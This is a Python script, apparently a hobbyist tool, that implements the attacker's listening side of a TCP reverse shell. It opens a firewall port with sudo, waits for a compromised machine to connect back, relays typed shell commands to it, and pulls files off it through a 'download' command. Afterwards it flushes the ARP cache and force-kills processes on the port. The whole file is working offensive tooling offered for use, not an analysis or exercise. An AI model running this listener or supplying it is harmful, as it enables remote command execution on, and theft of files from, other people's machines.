#!/bin/python

import argparse
import socket
import os


class TCP_Reverse_Shell:
	def __init__(self, local, port):
		self.port = port
		self.local = local
		self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


	def open_up_firewall_on_port(self):
		print("Opening up firewall on port {}".format(self.port))
		os.system("sudo ufw allow to any port {} proto tcp".format(self.port))


	def close_firewall_on_port(self):
		print("Closing firewall on port {}".format(self.port))
		os.system("sudo ufw delete allow to any port {} proto tcp".format(self.port))


	def flush_arp_cache(self):
		os.popen("sudo ip -s -s neigh flush all")


	def set_host_ip(self):
		if self.local:
			self.ip_addr = os.popen(
				"ip route get 1.2.3.4 | awk '{print $7}' | head -n 1"
			)
			self.ip_addr = self.ip_addr.read().strip()
		else:
			self.ip_addr = os.popen(
				"curl http://icanhazip.com"
			)
			self.ip_addr = self.ip_addr.read().strip()


	def bind_to_addr_on_port(self):
		self.server.bind((self.ip_addr, self.port))
		self.server.listen(2)
		print("[+] listening for tcp connection on {}::{}".format(self.ip_addr, self.port))


	def accept_client_connection(self):
		self.connection = self.server.accept()
		self.conn, self.client_addr = self.connection
		print("[+] received connection from {}".format(self.client_addr))


	def getfile(self):
		FILE = open(self.filename, "wb")
		while True:
			data = self.conn.recv(1024)
			if "DONE" in data.decode():
				data = data.decode().replace("DONE", "")
				data = data.encode()
				FILE.write(data)
				print("[+] Transfer completed.")
				FILE.close()
				break
			elif "Unable to retrieve" in data.decode():
				print("[-] Unable to retrieve {}".format(self.filename))
				break
			else:
				print("recieving...")
				FILE.write(data)



	def terminate_session(self):
		self.conn.send("exit".encode())
		self.conn.close()
		raise Exception("Terminated session")


	def set_up_shell(self):
		self.command = input("Shell> ")


	def reverse_shell_session(self):
		self.open_up_firewall_on_port()
		self.set_host_ip()
		self.bind_to_addr_on_port()
		self.accept_client_connection()
		while True:
			self.set_up_shell()
			if "exit" in self.command:
				self.terminate_session()
			elif not self.command.strip():
				print("Enter a command...")
				self.conn.send(" ".encode("utf-8"))
			elif "download" in self.command:
				self.conn.send(self.command.encode("utf-8"))
				self.filename = self.command.replace("download", "").strip()
				self.getfile()
			else:
				self.conn.send(self.command.encode("utf-8"))
				print(self.conn.recv(2084).decode())


if __name__ == "__main__":
	##get command line arguments
	argparser = argparse.ArgumentParser(
		description="Simple TCP Server for the intent of obtaining a reverse shell"
	)
	argparser.add_argument(
		"--local_host",
		default = False,
		required = False,
		help = "Choose whether host the server remotely, or over the local network"
	)
	argparser.add_argument(
		"--port",
		required = True,
		help = "Port for server to listen on",
		type = int
	)
	args = argparser.parse_args()

	##set up tcp server to listen for target
	reverse_shell_obj = TCP_Reverse_Shell(
		local=args.local_host,
		port=args.port
	)
	#reverse_shell_obj.reverse_shell_session()
	try:
		reverse_shell_obj.reverse_shell_session()
	except Exception as ex:
		##terminate the reverse shell session
		print(ex.__str__())
		
	reverse_shell_obj.close_firewall_on_port()
	reverse_shell_obj.flush_arp_cache()
	os.system("sudo lsof -t -i tcp:{} | xargs kill -9".format(args.port))
